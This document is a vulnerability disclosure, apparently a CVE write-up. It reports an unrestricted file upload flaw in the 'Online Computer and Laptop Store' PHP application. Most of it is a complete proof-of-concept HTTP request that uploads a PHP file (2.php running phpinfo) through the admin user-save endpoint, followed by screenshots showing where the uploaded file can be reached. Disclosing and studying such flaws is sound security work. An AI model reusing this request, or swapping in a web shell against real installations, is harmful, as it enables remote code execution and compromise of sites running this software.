File upload vulnerability exists in Online Computer and Laptop Store

version:v2021

download:https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html

code analysis

There are no restrictions on uploading files, so any file can be uploaded
![image](https://github.com/since2019-costin/cve/assets/169053485/4d5fb463-b6be-41c3-b87a-bf999605562c)

POC
```
POST /php-ocls/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------2482234165710351672344762468
Content-Length: 827
Origin: http://localhost
Connection: close
Referer: http://localhost/php-ocls/admin/?page=user
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

-----------------------------2482234165710351672344762468
Content-Disposition: form-data; name="id"

1
-----------------------------2482234165710351672344762468
Content-Disposition: form-data; name="firstname"

Adminstrator
-----------------------------2482234165710351672344762468
Content-Disposition: form-data; name="lastname"

Admin
-----------------------------2482234165710351672344762468
Content-Disposition: form-data; name="username"

admin
-----------------------------2482234165710351672344762468
Content-Disposition: form-data; name="password"


-----------------------------2482234165710351672344762468
Content-Disposition: form-data; name="img"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------2482234165710351672344762468--
```
![image](https://github.com/since2019-costin/cve/assets/169053485/7d350395-aa54-43f1-86d4-d11af541c732)

![image](https://github.com/since2019-costin/cve/assets/169053485/fff3057e-ee47-4ae3-831f-c36ae4737b51)
Get access path here
![image](https://github.com/since2019-costin/cve/assets/169053485/01bfe2ff-87ea-43b7-8775-41a2ddb824f2)
![image](https://github.com/since2019-costin/cve/assets/169053485/c58d9b5c-ec5a-471a-82f5-66f109139f44)

